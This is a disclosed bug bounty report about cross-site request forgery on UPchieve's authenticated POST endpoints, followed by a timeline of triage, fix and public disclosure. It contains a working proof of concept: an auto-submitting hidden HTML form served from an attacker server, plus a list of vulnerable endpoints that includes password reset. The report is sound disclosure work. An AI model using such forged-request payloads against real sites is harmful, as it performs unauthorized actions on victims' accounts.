---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-request-forgery-csrf
  - env/web
  - vuln/xss
  - vuln/csrf
  - vuln/cors-misconfig
  - impact/credential-theft
  - trigger/auth-required
  - trigger/victim-interaction
  - trigger/password-reset
  - trigger/session-cookie
  - trigger/cors-origin
substate: "resolved"
weakness: "Cross-Site Request Forgery (CSRF)"
enriched: true
body: true
date: 2022-02-13
submitted: 2021-08-18T06:16:46.093Z
bounty_usd: null
votes: 17
cve: []
program: "[[programs/upchieve|UPchieve]]"
reporter: "zeyu2001"
source: "https://hackerone.com/reports/1309435"
title: "Widespread CSRF on authenticated POST endpoints"
---
# Widespread CSRF on authenticated POST endpoints

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 17 | **Program:** UPchieve | **Disclosed:** 2022-02-13

- Report: [https://hackerone.com/reports/1309435](https://hackerone.com/reports/1309435)
- CWE: Cross-Site Request Forgery (CSRF)
- Submitted: 2021-08-18T06:16:46.093Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:

Cross-Site Request Forgery (CSRF) is possible on most, if not all, authenticated POST endpoints.

While CORS is configured such that the Access-Control-Allow-Origin header is set to `Access-Control-Allow-Origin: hackers.upchieve.org`, CORS does **not** prevent CSRF - it only prevents the attacker from reading the response. This does not stop the attacker from performing any arbitrary actions on behalf of the user.

This is possible through a simple HTML form with hidden inputs, submitted with JavaScript. While POST requests are made using JSON data by default, `application/x-www-form-urlencoded` is accepted as well. Because the user's session cookie does not have the SameSite attribute set, it is sent along with the request.

The following endpoints were found to be vulnerable:
- `POST /api/calendar/save` (set availability for text messages)
- `POST /api/training/score` (submit quizzes and subject certifications)
- `POST /auth/reset/send` (send password reset email)
- `POST /api/user/volunteer-approval/background-information` (submit background information)
- `POST /api/user/volunteer-approval/reference` (request a reference)

The attacker can perform any of the above actions on behalf of the user, as long as the user has a valid session cookie. There are probably more endpoints to be discovered, but I do not have access to them yet due to the approval / onboarding process.

PUT requests, particularly `PUT /api/user` (to update a user's phone number and account status), are not possible through this method. However, older browsers might not comply to CORS pre-flight requests and still allow a PUT request initiated by JavaScript on the attacker's site to go through.

## Steps To Reproduce:

1. As a victim, log in to https://hackers.upchieve.org/
2. Create a page like the one below.

This is an example for performing a CSRF on the `/api/calendar/save` endpoint (the full HTML file is attached). In this example, we set all the possible time slots to "true".

```html
<html>
  <body>
    <form action="https://hackers.upchieve.org/api/calendar/save" method="POST">
        <input type="hidden" name="availability[Sunday][12a]" value="true" />
        <input type="hidden" name="availability[Sunday][1a]" value="true" />
		
		...
		
        <input type="hidden" name="availability[Saturday][11p]" value="true" />
        <input type="hidden" name="tz" value="Asia/Singapore" />
    </form>
    <script>
      	document.forms[0].submit();
    </script>
  </body>
</html>
```

3. Serve the page on the attacker server.
4. As the victim, visit http://ATTACKER_SERVER/calendar_csrf.html

Once the HTML page loads on the browser, the POST request is submitted and we would see the following response:

```json
{"msg":"Schedule saved"}
```

5. Verify that the victim's calendar has been modified.

I have also prepared other CSRF payloads for the other endpoints.

- `calendar_csrf.html` performs the above-described attack.
- `reference_csrf.html` sends out reference requests on behalf of the victim.
- `quiz_csrf.html` submits quizzes for grading on behalf of the victim.
- `reset_csrf` sends out password resets on behalf of the victim.

## Supporting Material/References:

I have attached the CSRF payloads, a screenshot of the changed calendar, and a screenshot of the output from the quiz CSRF.

## Recommendations for Fixing/Mitigation

- Use CSRF tokens
- Use the SameSite attribute for cookies

## Impact

When an authenticated user visits any attacker-controlled site, the attacker is able to perform arbitrary authenticated actions on behalf of the user. While the attacker cannot obtain the request output from the CSRF, he is still able to perform sensitive actions blindly.

## Timeline

- **2021-08-19** @zeyu2001: Hi, any updates on this?
- **Report Filed**
- **2021-08-19** @dexter0us: Hi @zeyu2001,

Thanks for your submission, we highly appricate your detailed explanation in the report, I'll triage your report in a day or two after fully analyzing the impact and vulnerable sensitive endpoints.
Meanwhile if you want you can try to escalate the issue further and search for more sensitive endpoints.

---


> I do not have access to them yet due to the approval / onboarding process.

You can provide me your student and volunteer accounts I will get them approved for you.

Regards,
@dexter0us
- **2021-08-19** @zeyu2001: Hi @dexter0us,

Thanks for getting back to me! 

My volunteer account on https://hackers.upchieve.org/ is zeyu2001@wearehackerone.com. For the student account, could you help me to create one on the hacker-specific site using the email ██████? I only have access on the main site currently.

Thanks!
- **2021-08-24** @zeyu2001: Hey, just checking in - can this be triaged?
- **Report Severity Updated**
- **Report Triaged**
- **2021-09-22** @zeyu2001: Hi, any updates on this?
- **2021-09-23** @dexter0us: Hey @zeyu2001,

Sorry for the delay, our dev team is working on this issue. You might expect a patch in next ~4 weeks.

Thanks for your understanding.

Regards,
@dexter0us
- **2021-11-05** @thedevelopnik: I wanted to give a quick update since the last one was posted about 4 weeks ago and gave a 4 week timeline. We have been working on an overhaul of our backend code to make it easier to make changes which took longer than expected but is now done, merged and deployed as of this week. This issue is my next priority for the tech initiative time we have each sprint. Will update again as soon as we've got it done.
- **2021-11-06** @zeyu2001: Thanks!
- **2022-01-16** @zeyu2001: Hey, any updates on this?
- **2022-01-16** @thedevelopnik: Hey. Thanks for checking in. It's the constant push and pull in a small organization, but promises that our business/product people made have kept pushing this further out. We just finished annual/quarterly planning, and the good news is the thing the business/product people want isn't ready to come to us yet, so I believe I'm going to be able to make this the priority in the sprint starting this Tuesday. It remains the top-priority thing in my tech backlog. Will update on Tuesday after we have sprint planning.
- **2022-01-18** @thedevelopnik: We just wrapped up sprint planning, and this is in it! So ideally more quickly but we will definitely have this done in the next two weeks.
- **2022-01-31** @thedevelopnik: The work on this is done. We realized if we just deploy it now we're going to have a lot of people not refresh the frontend, and that will cause issues, so we're first deploying a version of the app that checks for a new version every 30 seconds, we'll wait til most people are rolled over to that, and then we'll get this deployed. I will confirm when this is in production, should be within 24-48 hours!
- **2022-02-01** @zeyu2001: Thanks for the update! :)
- **2022-02-04** @thedevelopnik: This is now deployed to all our test and production environments, and I'm pretty confident it's working because the devs making our new mobile app reached out with "Hey, uh, we can't log in all of a sudden?" But if you can please check it to confirm in hackers.upchieve.org I would greatly appreciate it! Thank you so much for your patience.
- **2022-02-13** @zeyu2001: Hey @thedevelopnik,

Looks good to me! Thanks!
- **2022-02-13** @zeyu2001: I think we could Resolve this now.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
